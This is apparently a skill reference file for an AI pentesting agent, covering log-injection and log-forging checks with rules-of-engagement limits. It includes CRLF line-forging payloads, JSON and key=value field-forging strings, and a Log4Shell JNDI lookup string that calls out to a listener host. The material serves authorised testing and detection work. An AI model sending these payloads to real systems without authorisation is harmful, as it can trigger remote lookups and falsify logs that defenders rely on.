---
name: log_injection
description: Log injection (from siem_logging_monitoring_audit specialist reference
  library)
---

# Log injection

Payload families, safety rules, and OOB pairing rules for log-injection and
log-forging checks.

## 1. Payload families

### CRLF into user-controlled logged fields

- Target fields (observed first from P1 inventory — the field must plausibly
  reach a log line): `User-Agent`, `X-Forwarded-For`, `Referer`, username on
  failed login, URL query parameters, filenames on upload.
- Payload shape (canary embedded so the forged segment is attributable):

  ```text
  baseline:  probe rj-pt-<engagement>-<nonce>
  CRLF:      probe%0d%0a2026-10-12 WARN rj-pt-<engagement>-<nonce> fake-user failed login
  ```

- Verification: operator excerpt shows the line split or a forged-looking
  line containing the canary -> log injection (D1 -> D2 on re-run). Most
  modern pipelines escape `%0d%0a`; a clean single-line entry is the
  negative result — record it.

### Log4Shell-style JNDI markers (DETECTION CANARY ONLY)

- Purpose: prove whether attacker-shaped `${jndi:...}` strings traverse into
  a lookup path, purely as a detection/masking question — NOT to exploit.
- Payload shape:

  ```text
  ${jndi:ldap://<oob-listener-domain>/rj-pt-<engagement>-<nonce>}
  ```

  `<oob-listener-domain>` is the `20` listener's domain for this run.
- Rules:
  1. Explicit RoE approval BEFORE the first send — some blue teams and WAFs
     treat any `jndi:` string as an incident; the operator decides.
  2. OOB callback = marker confirmed; the callback is logged by `20` and is
     the evidence pair. No follow-on payload is ever sent.
  3. Class context for the report (name only, applicability via `70`):
     CVE-2021-44228 "Log4Shell" (Apache Log4j2 JNDI lookup, verify against
     NVD/vendor advisory at authoring time).
  4. If no callback: negative result recorded as "no lookup-path traversal
     observed from this position" — NOT "not vulnerable".

### SIEM-parser forging (structured log fields)

- When logs are structured (JSON lines, key=value, syslog with structured
  data), injection can forge fields, not just lines: severity levels, user
  attribution, event ids.
- Payload shapes (canary always inside so the forged row is ours):
  - JSON body fields carrying `", "level": "INFO", "user": "rj-pt-<eng>-<nonce>"`
  - key=value fields carrying ` level=INFO user=rj-pt-<eng>-<nonce>`
  - syslog tag/structured-data carrying fake facility/severity
- Verification: the operator excerpt (or SIEM view) shows an entry whose
  severity or user attribution differs from what the application actually
  did -> forging finding: defenders' incident triage can be misled.

### Field-boundary probes (bounded)

- Quote/brace/paren escaping (`"`, `'`, `}`, `]`) around the canary to see
  whether delimiters are escaped in the log representation.
- Three payload generations per field maximum (dead-end rule); each
  generation's request is evidence-paired.

## 2. Safety rules (binding)

1. Never target the logging infrastructure itself beyond fields the target
   application legitimately records about our requests.
2. Never attempt file corruption/truncation via injection (null bytes, huge
   lines intended to rotate logs away); log-rotating an incident away is a
   destructive action — prohibited.
3. Log poisoning chains (injection -> webshell include path) belong to
   `45-rce-exploitation` with explicit RoE; from this skill they are only
   recorded as "injection present, chain possible, not attempted".
4. Bounded attempts per field; no fuzzing sweeps of log fields.
5. Every payload sent is recorded verbatim with timestamp + canary (the
   mapping CSV doubles as this record).

## 3. OOB pairing rules (with `20`)

- The OOB listener (from `20-traffic-manipulation`) owns callback capture;
  this skill never runs its own listener or uses third-party Interactsh
  (`nuclei -ni` posture across the library).
- Canaries in callback URLs use the same `rj-pt-<engagement>-<nonce>` format;
  the nonce maps the callback to the action class unambiguously.
- Callback seen but no corresponding target-side log entry = interesting
   mismatch (blind traversal without logging) — report row, not a vuln claim
   by itself.
- No callback + RoE said send once = done; repeat sends need a reason (D2
  re-verification is an accepted reason, once).

